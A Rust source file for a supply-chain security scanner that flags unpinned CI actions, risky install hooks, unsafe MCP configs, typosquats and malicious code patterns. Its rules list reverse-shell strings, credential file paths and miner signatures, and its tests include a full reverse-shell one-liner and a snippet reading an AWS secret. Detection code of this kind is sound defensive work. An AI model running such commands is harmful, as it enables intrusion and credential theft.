#![forbid(unsafe_code)]

use crate::types::SeverityLevel;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;
use walkdir::WalkDir;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SupplyChainFinding {
    pub rule_id: String,
    pub signal_name: String,
    pub severity: SeverityLevel,
    pub message: String,
    pub file_path: Option<String>,
    pub line: Option<usize>,
    pub snippet: Option<String>,
}

pub struct LocalSupplyChainAnalyzer;

pub const POPULAR_PACKAGES: &[&str] = &[
    "lodash",
    "express",
    "react",
    "react-dom",
    "axios",
    "chalk",
    "commander",
    "vue",
    "next",
    "tslib",
    "debug",
    "moment",
    "webpack",
    "babel",
    "rxjs",
    "requests",
    "urllib3",
    "flask",
    "django",
    "pytest",
    "numpy",
    "pandas",
    "scipy",
    "boto3",
    "cryptography",
    "jinja2",
    "certifi",
    "click",
    "pip",
    "serde",
    "tokio",
    "syn",
    "quote",
    "anyhow",
    "rand",
    "regex",
    "log",
    "thiserror",
    "itertools",
    "futures",
    "hyper",
    "reqwest",
    "clap",
    "tracing",
];

impl LocalSupplyChainAnalyzer {
    pub fn scan_workspace(root: &Path) -> Vec<SupplyChainFinding> {
        let mut findings = Vec::new();

        // 1. Scan Workflows (.github/workflows)
        Self::scan_github_workflows(root, &mut findings);

        // 2. Scan MCP configs (mcp.json, .cursor/mcp.json)
        Self::scan_mcp_configs(root, &mut findings);

        // 3. Scan manifests and lockfiles
        Self::scan_manifests(root, &mut findings);

        // 4. Scan source files and dependency trees
        Self::scan_source_files(root, &mut findings);

        findings
    }

    pub fn scan_github_workflows(root: &Path, findings: &mut Vec<SupplyChainFinding>) {
        let wf_dir = root.join(".github").join("workflows");
        if !wf_dir.is_dir() {
            return;
        }

        if let Ok(entries) = fs::read_dir(wf_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                if ext == "yml" || ext == "yaml" {
                    if let Ok(content) = fs::read_to_string(&path) {
                        let rel = path
                            .strip_prefix(root)
                            .unwrap_or(&path)
                            .to_string_lossy()
                            .replace('\\', "/");
                        let mut has_pr_target = false;
                        for (idx, line) in content.lines().enumerate() {
                            let line_num = idx + 1;
                            let trimmed = line.trim();

                            if trimmed.contains("pull_request_target") {
                                has_pr_target = true;
                            }

                            // Rule SC-014: unpinned actions (e.g. uses: actions/checkout@v2 or @main)
                            if trimmed.starts_with("uses:") {
                                let action_ref = trimmed.trim_start_matches("uses:").trim();
                                if let Some((action_name, git_ref)) = action_ref.split_once('@') {
                                    if !action_name.starts_with("./")
                                        && !action_name.starts_with("docker://")
                                    {
                                        // 40-char SHA check
                                        let is_sha = git_ref.len() == 40
                                            && git_ref.chars().all(|c| c.is_ascii_hexdigit());
                                        if !is_sha {
                                            findings.push(SupplyChainFinding {
                                                rule_id: "SC-014".to_string(),
                                                signal_name: "github_actions_unpinned_ref".to_string(),
                                                severity: SeverityLevel::High,
                                                message: format!(
                                                    "GitHub Actions workflow uses unpinned ref '{}' instead of immutable commit SHA",
                                                    action_ref
                                                ),
                                                file_path: Some(rel.clone()),
                                                line: Some(line_num),
                                                snippet: Some(trimmed.to_string()),
                                            });
                                        }
                                    }
                                }
                            }

                            if has_pr_target
                                && (trimmed
                                    .contains("ref: ${{ github.event.pull_request.head.sha }}")
                                    || trimmed.contains("ref: ${{ github.head_ref }}"))
                            {
                                findings.push(SupplyChainFinding {
                                    rule_id: "SC-014".to_string(),
                                    signal_name: "github_actions_unpinned_ref".to_string(),
                                    severity: SeverityLevel::High,
                                    message: "Dangerous pull_request_target combined with checkout of untrusted pull request head".to_string(),
                                    file_path: Some(rel.clone()),
                                    line: Some(line_num),
                                    snippet: Some(trimmed.to_string()),
                                });
                            }
                        }
                    }
                }
            }
        }
    }

    pub fn scan_mcp_configs(root: &Path, findings: &mut Vec<SupplyChainFinding>) {
        let candidates = [
            root.join("mcp.json"),
            root.join(".cursor").join("mcp.json"),
            root.join(".vscode").join("mcp.json"),
        ];

        for path in &candidates {
            if path.is_file() {
                if let Ok(content) = fs::read_to_string(path) {
                    let rel = path
                        .strip_prefix(root)
                        .unwrap_or(path)
                        .to_string_lossy()
                        .replace('\\', "/");
                    if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
                        if let Some(servers) = val.get("mcpServers").and_then(|s| s.as_object()) {
                            for (srv_name, srv_val) in servers {
                                let command = srv_val
                                    .get("command")
                                    .and_then(|c| c.as_str())
                                    .unwrap_or("");
                                let args: Vec<&str> = srv_val
                                    .get("args")
                                    .and_then(|a| a.as_array())
                                    .map(|arr| arr.iter().filter_map(|v| v.as_str()).collect())
                                    .unwrap_or_default();

                                // Rule SC-015: npx -y without pinned version
                                if (command == "npx" || args.contains(&"npx"))
                                    && (args.contains(&"-y") || args.contains(&"--yes"))
                                {
                                    let unpinned = args.iter().any(|arg| {
                                        !arg.starts_with('-') && !arg.contains('@') && *arg != "npx"
                                    });
                                    if unpinned {
                                        findings.push(SupplyChainFinding {
                                            rule_id: "SC-015".to_string(),
                                            signal_name: "mcp_unsafe_tool_config".to_string(),
                                            severity: SeverityLevel::High,
                                            message: format!(
                                                "MCP server '{}' configures dynamic unpinned package execution via 'npx -y'",
                                                srv_name
                                            ),
                                            file_path: Some(rel.clone()),
                                            line: None,
                                            snippet: Some(srv_val.to_string()),
                                        });
                                    }
                                }

                                // Rule SC-015: unrestricted filesystem root "/" or "C:\" in args
                                for arg in &args {
                                    if *arg == "/" || *arg == "C:\\" || *arg == "C:/" {
                                        findings.push(SupplyChainFinding {
                                            rule_id: "SC-015".to_string(),
                                            signal_name: "mcp_unsafe_tool_config".to_string(),
                                            severity: SeverityLevel::High,
                                            message: format!(
                                                "MCP server '{}' grants unrestricted host filesystem root '{}'",
                                                srv_name, arg
                                            ),
                                            file_path: Some(rel.clone()),
                                            line: None,
                                            snippet: Some(arg.to_string()),
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    pub fn scan_manifests(root: &Path, findings: &mut Vec<SupplyChainFinding>) {
        for entry in WalkDir::new(root)
            .max_depth(5)
            .into_iter()
            .filter_entry(|e| {
                if e.depth() == 0 {
                    return true;
                }
                let name = e.file_name().to_string_lossy();
                !(e.file_type().is_dir() && is_ignored_scan_dir(&name))
            })
            .flatten()
        {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

            // SC-001 & SC-002: Check package.json install hooks
            if file_name == "package.json" {
                if let Ok(content) = fs::read_to_string(path) {
                    let rel = path
                        .strip_prefix(root)
                        .unwrap_or(path)
                        .to_string_lossy()
                        .replace('\\', "/");
                    if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
                        if let Some(scripts) = val.get("scripts").and_then(|s| s.as_object()) {
                            for (hook, cmd_val) in scripts {
                                if hook == "preinstall"
                                    || hook == "install"
                                    || hook == "postinstall"
                                {
                                    let cmd = cmd_val.as_str().unwrap_or("");
                                    findings.push(SupplyChainFinding {
                                        rule_id: "SC-001".to_string(),
                                        signal_name: "install_script_execution".to_string(),
                                        severity: SeverityLevel::High,
                                        message: format!(
                                            "Package defines lifecycle install hook '{}': {}",
                                            hook, cmd
                                        ),
                                        file_path: Some(rel.clone()),
                                        line: None,
                                        snippet: Some(format!("\"{}\": \"{}\"", hook, cmd)),
                                    });

                                    // Check network egress in hook
                                    if cmd.contains("curl ")
                                        || cmd.contains("wget ")
                                        || cmd.contains("Invoke-WebRequest")
                                        || cmd.contains("fetch(")
                                        || cmd.contains("http.get")
                                        || cmd.contains("net.connect")
                                    {
                                        findings.push(SupplyChainFinding {
                                            rule_id: "SC-002".to_string(),
                                            signal_name: "install_script_network_egress"
                                                .to_string(),
                                            severity: SeverityLevel::Critical,
                                            message: format!(
                                                "Install hook '{}' initiates network egress: {}",
                                                hook, cmd
                                            ),
                                            file_path: Some(rel.clone()),
                                            line: None,
                                            snippet: Some(cmd.to_string()),
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // SC-001 & SC-002: setup.py cmdclass
            if file_name == "setup.py" {
                if let Ok(content) = fs::read_to_string(path) {
                    let rel = path
                        .strip_prefix(root)
                        .unwrap_or(path)
                        .to_string_lossy()
                        .replace('\\', "/");
                    if content.contains("cmdclass")
                        && (content.contains("install") || content.contains("develop"))
                    {
                        findings.push(SupplyChainFinding {
                            rule_id: "SC-001".to_string(),
                            signal_name: "install_script_execution".to_string(),
                            severity: SeverityLevel::High,
                            message: "setup.py overrides cmdclass during package installation"
                                .to_string(),
                            file_path: Some(rel.clone()),
                            line: None,
                            snippet: None,
                        });
                    }
                }
            }

            // SC-009: Lockfiles and unpinned tarballs / git URLs
            if file_name == "package-lock.json"
                || file_name == "yarn.lock"
                || file_name == "pnpm-lock.yaml"
            {
                if let Ok(content) = fs::read_to_string(path) {
                    let rel = path
                        .strip_prefix(root)
                        .unwrap_or(path)
                        .to_string_lossy()
                        .replace('\\', "/");
                    for (idx, line) in content.lines().enumerate() {
                        let trimmed = line.trim();
                        let is_git = trimmed.contains("git+ssh://")
                            || trimmed.contains("git+https://")
                            || trimmed.contains("git://");
                        let is_unpinned_http =
                            trimmed.contains("http://") && !trimmed.contains("registry.npmjs.org");
                        let is_unpinned_git = is_git && {
                            if let Some(pos) = trimmed.rfind('#') {
                                let frag =
                                    trimmed[pos + 1..].trim_matches(|c: char| !c.is_alphanumeric());
                                !(frag.len() == 40 && frag.chars().all(|c| c.is_ascii_hexdigit()))
                            } else {
                                true
                            }
                        };

                        if is_unpinned_http || is_unpinned_git {
                            findings.push(SupplyChainFinding {
                                rule_id: "SC-009".to_string(),
                                signal_name: "unpinned_git_or_http_tarball".to_string(),
                                severity: SeverityLevel::Medium,
                                message: format!(
                                    "Dependency resolves from unpinned URL or tarball: {}",
                                    trimmed
                                ),
                                file_path: Some(rel.clone()),
                                line: Some(idx + 1),
                                snippet: Some(trimmed.to_string()),
                            });
                        }
                    }
                }
            }

            // SC-011: Precompiled binary blobs without reproducible build metadata
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            if ext == "node" || ext == "dylib" || ext == "so" || ext == "dll" || ext == "exe" {
                let rel = path
                    .strip_prefix(root)
                    .unwrap_or(path)
                    .to_string_lossy()
                    .replace('\\', "/");
                let has_build_metadata = root.join("binding.gyp").exists()
                    || root.join("CMakeLists.txt").exists()
                    || root.join("Makefile").exists()
                    || root.join("Cargo.toml").exists()
                    || root.join("build.rs").exists()
                    || root.join("setup.py").exists();
                if !has_build_metadata {
                    findings.push(SupplyChainFinding {
                        rule_id: "SC-011".to_string(),
                        signal_name: "native_addon_binary_blob".to_string(),
                        severity: SeverityLevel::Medium,
                        message: format!("Package ships precompiled native binary blob without reproducible build metadata: {}", rel),
                        file_path: Some(rel),
                        line: None,
                        snippet: None,
                    });
                }
            }
        }
    }

    pub fn scan_source_files(root: &Path, findings: &mut Vec<SupplyChainFinding>) {
        for entry in WalkDir::new(root)
            .max_depth(10)
            .into_iter()
            .filter_entry(|e| {
                if e.depth() == 0 {
                    return true;
                }
                let name = e.file_name().to_string_lossy();
                !(e.file_type().is_dir() && is_ignored_scan_dir(&name))
            })
            .flatten()
        {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }

            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            if !matches!(
                ext,
                "js" | "mjs" | "cjs" | "ts" | "jsx" | "tsx" | "py" | "rs" | "go" | "sh" | "bash"
            ) {
                continue;
            }

            if let Ok(content) = fs::read_to_string(path) {
                let file_findings = Self::analyze_file_content(path, &content);
                for mut f in file_findings {
                    if let Ok(rel) = path.strip_prefix(root) {
                        f.file_path = Some(rel.to_string_lossy().replace('\\', "/"));
                    }
                    findings.push(f);
                }
            }
        }
    }

    pub fn analyze_file_content(path: &Path, content: &str) -> Vec<SupplyChainFinding> {
        let mut findings = Vec::new();
        let path_str = path.to_string_lossy().replace('\\', "/");

        // Rule SC-008: Trojan Source Unicode Bidirectional Overrides
        for (line_idx, line) in content.lines().enumerate() {
            for ch in line.chars() {
                let u = ch as u32;
                if (0x202A..=0x202E).contains(&u) || (0x2066..=0x2069).contains(&u) {
                    findings.push(SupplyChainFinding {
                        rule_id: "SC-008".to_string(),
                        signal_name: "trojan_source_bidi".to_string(),
                        severity: SeverityLevel::Critical,
                        message: format!(
                            "Source file contains invisible Trojan Source Unicode Bidirectional Override character (U+{:04X})",
                            u
                        ),
                        file_path: Some(path_str.clone()),
                        line: Some(line_idx + 1),
                        snippet: Some(line.trim().to_string()),
                    });
                    break;
                }
            }
        }

        // Module-level flags for SC-006: Credential Harvesting + Socket Network
        let mut has_env_secret_access = false;
        let mut env_secret_line = 0;
        let mut env_secret_snippet = String::new();
        let mut has_network_socket = false;

        for (line_idx, line) in content.lines().enumerate() {
            let line_num = line_idx + 1;
            let trimmed = line.trim();

            // Rule SC-012: Crypto miner signatures & WebAssembly crypto-mining
            if trimmed.contains("stratum+tcp://")
                || trimmed.contains("stratum+ssl://")
                || trimmed.contains("xmrig")
                || trimmed.contains("cryptonight")
                || trimmed.contains("coinhive")
                || trimmed.contains("cryptonight_wasm")
                || trimmed.contains("wasm-miner")
                || trimmed.contains("minr.pw")
                || trimmed.contains("crypto-loot")
            {
                findings.push(SupplyChainFinding {
                    rule_id: "SC-012".to_string(),
                    signal_name: "crypto_miner_stratum".to_string(),
                    severity: SeverityLevel::Critical,
                    message: "Discovered active cryptocurrency miner connection string or WebAssembly mining signature".to_string(),
                    file_path: Some(path_str.clone()),
                    line: Some(line_num),
                    snippet: Some(trimmed.to_string()),
                });
            }

            // Rule SC-013: Reverse Shell signatures
            if trimmed.contains("/bin/sh -i")
                || trimmed.contains("/bin/bash -i")
                || trimmed.contains("nc -e ")
                || trimmed.contains("nc.exe -e")
                || trimmed.contains("bash -i >& /dev/tcp/")
                || trimmed.contains("sh -i >& /dev/tcp/")
                || (trimmed.contains("pty.spawn") && trimmed.contains("/bin/bash"))
            {
                findings.push(SupplyChainFinding {
                    rule_id: "SC-013".to_string(),
                    signal_name: "reverse_shell_signature".to_string(),
                    severity: SeverityLevel::Critical,
                    message: "Discovered interactive reverse shell execution signature".to_string(),
                    file_path: Some(path_str.clone()),
                    line: Some(line_num),
                    snippet: Some(trimmed.to_string()),
                });
            }

            // Rule SC-007: Sensitive Filesystem Access
            if trimmed.contains(".ssh/id_rsa")
                || trimmed.contains(".ssh/id_ed25519")
                || trimmed.contains(".aws/credentials")
                || trimmed.contains(".npmrc")
                || trimmed.contains(".kube/config")
                || trimmed.contains("/etc/passwd")
                || trimmed.contains("/etc/shadow")
                || trimmed.contains("/proc/self/mem")
            {
                findings.push(SupplyChainFinding {
                    rule_id: "SC-007".to_string(),
                    signal_name: "sensitive_filesystem_access".to_string(),
                    severity: SeverityLevel::Critical,
                    message: "Attempts to read host credentials or sensitive OS filesystem files"
                        .to_string(),
                    file_path: Some(path_str.clone()),
                    line: Some(line_num),
                    snippet: Some(trimmed.to_string()),
                });
            }

            // Rule SC-003: Dynamic Code Evaluation
            if trimmed.contains("eval(")
                || trimmed.contains("new Function(")
                || trimmed.contains("vm.runInNewContext(")
                || trimmed.contains("vm.runInThisContext(")
                || (trimmed.contains("exec(")
                    && (trimmed.contains("base64.b64decode") || trimmed.contains("b64decode")))
            {
                findings.push(SupplyChainFinding {
                    rule_id: "SC-003".to_string(),
                    signal_name: "dynamic_code_eval".to_string(),
                    severity: SeverityLevel::High,
                    message: "Dynamic code evaluation construct (eval / new Function / exec) detected in source AST".to_string(),
                    file_path: Some(path_str.clone()),
                    line: Some(line_num),
                    snippet: Some(trimmed.to_string()),
                });
            }

            // Rule SC-004: Child Process Shell Execution
            if (trimmed.contains("child_process")
                && (trimmed.contains("exec(") || trimmed.contains("execSync(")))
                || (trimmed.contains("subprocess.Popen") && trimmed.contains("shell=True"))
                || (trimmed.contains("subprocess.call") && trimmed.contains("shell=True"))
                || (trimmed.contains("os.system("))
            {
                findings.push(SupplyChainFinding {
                    rule_id: "SC-004".to_string(),
                    signal_name: "child_process_shell".to_string(),
                    severity: SeverityLevel::High,
                    message: "Child process spawned with arbitrary OS shell interpolation enabled"
                        .to_string(),
                    file_path: Some(path_str.clone()),
                    line: Some(line_num),
                    snippet: Some(trimmed.to_string()),
                });
            }

            // Check for SC-006 components
            if (trimmed.contains("process.env")
                || trimmed.contains("os.environ")
                || trimmed.contains("std::env::var"))
                && (trimmed.contains("AWS_SECRET")
                    || trimmed.contains("GITHUB_TOKEN")
                    || trimmed.contains("NPM_TOKEN")
                    || trimmed.contains("OPENAI_API_KEY")
                    || trimmed.contains("PRIVATE_KEY")
                    || trimmed.contains("ACCESS_KEY"))
            {
                has_env_secret_access = true;
                env_secret_line = line_num;
                env_secret_snippet = trimmed.to_string();
            }

            if trimmed.contains("require('net')")
                || trimmed.contains("require('http')")
                || trimmed.contains("require('https')")
                || trimmed.contains("require('dgram')")
                || trimmed.contains("import net from")
                || trimmed.contains("import http from")
                || trimmed.contains("import socket")
                || trimmed.contains("import requests")
                || trimmed.contains("import urllib")
            {
                has_network_socket = true;
            }

            // Rule SC-005: High Entropy Obfuscation
            if trimmed.len() > 256 {
                let entropy = compute_shannon_entropy(trimmed);
                if entropy > 5.85
                    && (trimmed.contains("_0x")
                        || trimmed.contains("Buffer.from")
                        || trimmed.contains("base64")
                        || trimmed.contains("atob"))
                {
                    findings.push(SupplyChainFinding {
                        rule_id: "SC-005".to_string(),
                        signal_name: "high_entropy_obfuscation".to_string(),
                        severity: SeverityLevel::High,
                        message: format!(
                            "String literal exceeds 256 bytes with suspicious Shannon entropy ({:.2} bits/byte) and obfuscation markers",
                            entropy
                        ),
                        file_path: Some(path_str.clone()),
                        line: Some(line_num),
                        snippet: Some(trimmed[..std::cmp::min(trimmed.len(), 100)].to_string()),
                    });
                }
            }
        }

        // Rule SC-006 trigger
        if has_env_secret_access && has_network_socket {
            findings.push(SupplyChainFinding {
                rule_id: "SC-006".to_string(),
                signal_name: "env_credential_harvesting".to_string(),
                severity: SeverityLevel::Critical,
                message: "Module accesses sensitive environment API secrets while importing network socket primitives".to_string(),
                file_path: Some(path_str),
                line: Some(env_secret_line),
                snippet: Some(env_secret_snippet),
            });
        }

        findings
    }

    /// Check package name for typosquatting against top packages list (SC-010)
    pub fn check_package(name: &str, _version: &str, _ecosystem: &str) -> Vec<SupplyChainFinding> {
        let mut findings = Vec::new();
        let lower = name.to_lowercase();

        // 1. Homoglyph / confusable normalization
        let homoglyph_norm = lower
            .replace('0', "o")
            .replace('1', "l")
            .replace("rn", "m")
            .replace("vv", "w");

        for &pop in POPULAR_PACKAGES {
            if lower == pop {
                continue;
            }
            let dist = damerau_levenshtein_distance(&lower, pop);
            if dist == 1 {
                findings.push(SupplyChainFinding {
                    rule_id: "SC-010".to_string(),
                    signal_name: "typosquat_top_10k".to_string(),
                    severity: SeverityLevel::High,
                    message: format!(
                        "Package '{}' is a suspected typosquat of popular package '{}' (edit distance 1)",
                        name, pop
                    ),
                    file_path: None,
                    line: None,
                    snippet: None,
                });
                break;
            }

            // Homoglyph confusable match (e.g. l0dash -> lodash, react-d0m -> react-dom)
            if homoglyph_norm != lower && homoglyph_norm == pop {
                findings.push(SupplyChainFinding {
                    rule_id: "SC-010".to_string(),
                    signal_name: "typosquat_top_10k".to_string(),
                    severity: SeverityLevel::High,
                    message: format!(
                        "Package '{}' is a suspected homoglyph confusable typosquat of popular package '{}'",
                        name, pop
                    ),
                    file_path: None,
                    line: None,
                    snippet: None,
                });
                break;
            }

            // Scope confusion match: e.g. "types-node" vs "node" or "angular-core" vs "angular"
            if lower.contains('-') {
                let parts: Vec<&str> = lower.split('-').collect();
                if parts.len() == 2 && parts[1] == pop && !pop.is_empty() && parts[0].len() <= 6 {
                    findings.push(SupplyChainFinding {
                        rule_id: "SC-010".to_string(),
                        signal_name: "typosquat_top_10k".to_string(),
                        severity: SeverityLevel::High,
                        message: format!(
                            "Package '{}' exhibits scope confusion pattern targeting popular package '{}'",
                            name, pop
                        ),
                        file_path: None,
                        line: None,
                        snippet: None,
                    });
                    break;
                }
            }
        }

        findings
    }
}

/// Directories never walked by workspace supply-chain scans (vendored, generated, cache, VCS).
/// Skipping hidden dirs also avoids the multi-thousand-file `.sca-cache` and `.work` trees.
fn is_ignored_scan_dir(name: &str) -> bool {
    // `.github` and `.cursor`/`.vscode` configs are scanned by dedicated rules, not this walk.
    name.starts_with('.')
        || matches!(
            name,
            "node_modules" | "target" | "dist" | "build" | "vendor" | "inputs" | "outputs"
        )
}

pub fn compute_shannon_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for b in s.bytes() {
        counts[b as usize] += 1;
    }
    let len = s.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = (count as f64) / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

#[allow(clippy::needless_range_loop)]
pub fn damerau_levenshtein_distance(a: &str, b: &str) -> usize {
    let a_chars: Vec<char> = a.chars().collect();
    let b_chars: Vec<char> = b.chars().collect();
    let len_a = a_chars.len();
    let len_b = b_chars.len();

    if len_a == 0 {
        return len_b;
    }
    if len_b == 0 {
        return len_a;
    }

    let mut d = vec![vec![0usize; len_b + 1]; len_a + 1];

    for i in 0..=len_a {
        d[i][0] = i;
    }
    for j in 0..=len_b {
        d[0][j] = j;
    }

    for i in 1..=len_a {
        for j in 1..=len_b {
            let cost = if a_chars[i - 1] == b_chars[j - 1] {
                0
            } else {
                1
            };
            d[i][j] = std::cmp::min(
                std::cmp::min(d[i - 1][j] + 1, d[i][j - 1] + 1),
                d[i - 1][j - 1] + cost,
            );

            if i > 1
                && j > 1
                && a_chars[i - 1] == b_chars[j - 2]
                && a_chars[i - 2] == b_chars[j - 1]
            {
                d[i][j] = std::cmp::min(d[i][j], d[i - 2][j - 2] + 1);
            }
        }
    }

    d[len_a][len_b]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_trojan_source_bidi_detected() {
        let snippet =
            "const accessLevel = \"user\u{202E}\u{2066} // Check if admin \u{2069}\u{2066}\";";
        let findings =
            LocalSupplyChainAnalyzer::analyze_file_content(Path::new("test.js"), snippet);
        assert!(findings.iter().any(|f| f.rule_id == "SC-008"));
    }

    #[test]
    fn test_typosquatting_detected() {
        let findings = LocalSupplyChainAnalyzer::check_package("loadsh", "1.0.0", "npm");
        assert!(findings.iter().any(|f| f.rule_id == "SC-010"));

        let findings2 = LocalSupplyChainAnalyzer::check_package("requsts", "2.28.0", "PyPI");
        assert!(findings2.iter().any(|f| f.rule_id == "SC-010"));

        let findings3 = LocalSupplyChainAnalyzer::check_package("l0dash", "1.0.0", "npm");
        assert!(findings3.iter().any(|f| f.rule_id == "SC-010"));
    }

    #[test]
    fn test_reverse_shell_detected() {
        let snippet = "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'";
        let findings =
            LocalSupplyChainAnalyzer::analyze_file_content(Path::new("payload.sh"), snippet);
        assert!(findings.iter().any(|f| f.rule_id == "SC-013"));
    }

    #[test]
    fn test_credential_harvesting_detected() {
        let snippet = r#"
            const net = require('net');
            const token = process.env.AWS_SECRET_ACCESS_KEY;
            const client = net.createConnection({ port: 80 }, () => {});
        "#;
        let findings =
            LocalSupplyChainAnalyzer::analyze_file_content(Path::new("index.js"), snippet);
        assert!(findings.iter().any(|f| f.rule_id == "SC-006"));
    }

    #[test]
    fn test_entropy_calculation() {
        let low_entropy = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        let high_entropy = "9F8a7c2bE4d1f0A3c8B6e5D7f2A1c4E6b8D0f3A5c7E9b1D2f4A6c8E0b3D5f7A9";
        assert!(compute_shannon_entropy(low_entropy) < 2.0);
        assert!(compute_shannon_entropy(high_entropy) > 3.5);
    }
}
